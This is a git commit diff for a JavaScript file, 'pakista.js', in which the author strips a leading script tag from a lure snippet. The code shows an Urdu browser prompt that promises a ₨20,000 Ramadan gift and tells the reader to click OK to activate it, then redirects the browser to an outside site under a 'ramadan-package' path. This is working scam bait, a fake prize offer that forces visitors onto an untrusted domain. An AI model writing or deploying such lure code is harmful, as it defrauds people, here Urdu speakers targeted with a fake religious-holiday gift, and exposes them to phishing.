44b1cbd46c572b4bba280aed82623216aa12be87
newetijazz20 <newetijazz20@gmail.com>
2026-02-10 08:31:55 +0100

    Update pakista.js

--- pakista.js
+++ pakista.js
@@ -1,4 +1,4 @@
-<script>var password = '₨20,000 کا دعوی کریں۔'
+var password = '₨20,000 کا دعوی کریں۔'
 password = prompt('Shahid: مبارک ہو، آپ ₨20,000 کا دعویٰ کرنے کے اہل ہیں رمضان گفٹ، ابھی ایکٹیویٹ کرنے کے لیے OK پر کلک کریں۔','₨20,000 کا دعوی کریں۔');
 if (password != '₨20,000 کا دعوی کریں۔') {
     location.href ='https://www.krhitid.site/ramadan-package';
